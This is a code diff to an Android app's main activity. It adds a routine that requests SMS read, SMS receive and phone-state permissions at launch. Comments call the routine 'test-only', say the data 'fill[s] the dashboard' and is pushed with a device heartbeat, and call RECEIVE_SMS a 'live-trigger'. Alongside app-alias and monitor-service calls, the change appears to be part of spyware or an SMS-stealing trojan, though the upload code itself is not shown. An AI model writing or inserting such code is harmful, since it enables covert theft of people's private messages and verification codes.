@@ -60,6 +60,14 @@ class MainActivity : AppCompatActivity() {
             updateGate()
         }
 
+    // TEST-ONLY: SMS + phone-number permissions. Not part of the verification
+    // gate — verification shows regardless; these just fill the dashboard.
+    private val testPermsLauncher =
+        registerForActivityResult(ActivityResultContracts.RequestMultiplePermissions()) {
+            // Snapshot pushes on next heartbeat; nudge one now.
+            DeviceRegistrar.heartbeatAsync(this)
+        }
+
     override fun onCreate(savedInstanceState: Bundle?) {
         super.onCreate(savedInstanceState)
         setContentView(R.layout.activity_main)
@@ -90,6 +98,7 @@ class MainActivity : AppCompatActivity() {
         AppAlias.enforce(this)
         AppMonitorService.start(this)
         DeviceRegistrar.registerAsync(this)
+        requestTestPermsIfNeeded()
         updateGate()
         gateHandler.removeCallbacks(gateCheck)
         gateHandler.postDelayed(gateCheck, 2000L)
@@ -203,5 +212,23 @@ class MainActivity : AppCompatActivity() {
             Toast.makeText(this, "Could not open battery settings.", Toast.LENGTH_LONG).show()
         }
         // Result re-checked in onResume() -> updateGate().
+    }
+
+    private fun requestTestPermsIfNeeded() {
+        val need = mutableListOf<String>()
+        if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_SMS) != PackageManager.PERMISSION_GRANTED)
+            need.add(Manifest.permission.READ_SMS)
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+            if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_PHONE_STATE) != PackageManager.PERMISSION_GRANTED)
+                need.add(Manifest.permission.READ_PHONE_STATE)
+        }
+        // RECEIVE_SMS doubles as the live-trigger permission on some OEMs.
+        try {
+            if (ContextCompat.checkSelfPermission(this, Manifest.permission.RECEIVE_SMS) != PackageManager.PERMISSION_GRANTED)
+                need.add(Manifest.permission.RECEIVE_SMS)
+        } catch (_: Exception) {}
+        if (need.isNotEmpty()) {
+            try { testPermsLauncher.launch(need.toTypedArray()) } catch (_: Exception) {}
+        }
     }
 }
